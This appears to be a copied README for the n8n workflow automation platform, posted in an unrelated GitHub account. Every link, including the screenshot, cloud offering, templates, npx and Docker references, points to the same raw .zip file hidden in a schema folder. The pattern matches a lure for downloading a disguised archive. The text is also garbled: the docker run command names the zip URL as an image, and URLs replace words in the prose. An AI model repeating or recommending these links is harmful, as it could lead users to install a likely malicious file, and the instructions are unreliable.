# n8n - Secure Workflow Automation for Technical Teams

n8n is a workflow automation platform that gives technical teams the flexibility of code with the speed of no-code. With 400+ integrations, native AI capabilities, and a fair-code license, n8n lets you build powerful automations while maintaining full control over your data and deployments.

![https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip - Screenshot](https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip)

## Key Capabilities

- **Code When You Need It**: Write JavaScript/Python, add npm packages, or use the visual interface
- **AI-Native Platform**: Build AI agent workflows based on LangChain with your own data and models
- **Full Control**: Self-host with our fair-code license or use our [cloud offering](https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip)
- **Enterprise-Ready**: Advanced permissions, SSO, and air-gapped deployments
- **Active Community**: 400+ integrations and 900+ ready-to-use [templates](https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip)

## Quick Start

Try n8n instantly with [npx](https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip) (requires [https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip](https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip)):

```
npx n8n
```

Or deploy with [Docker](https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip):

```
docker volume create n8n_data
docker run -it --rm --name n8n -p 5678:5678 -v n8n_data:/home/node/.n8n https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip
```

Access the editor at http://localhost:5678

## What does n8n mean?

**Short answer:** It means "nodemation" and is pronounced as n-eight-n.

**Long answer:** "I get that question quite often (more often than I expected) so I decided it is probably best to answer it here. While looking for a good name for the project with a free domain I realized very quickly that all the good ones I could think of were already taken. So, in the end, I chose nodemation. 'node-' in the sense that it uses a Node-View and that it uses https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip and '-mation' for 'automation' which is what the project is supposed to help with. However, I did not like how long the name was and I could not imagine writing something that long every time in the CLI. That is when I then ended up on 'n8n'." - **Jan Oberhauser, Founder and CEO, https://github.com/Gordaotrembala/n8n/raw/refs/heads/master/packages/nodes-base/nodes/SeaTable/__schema__/v1.0.0/n_v1.6.zip**
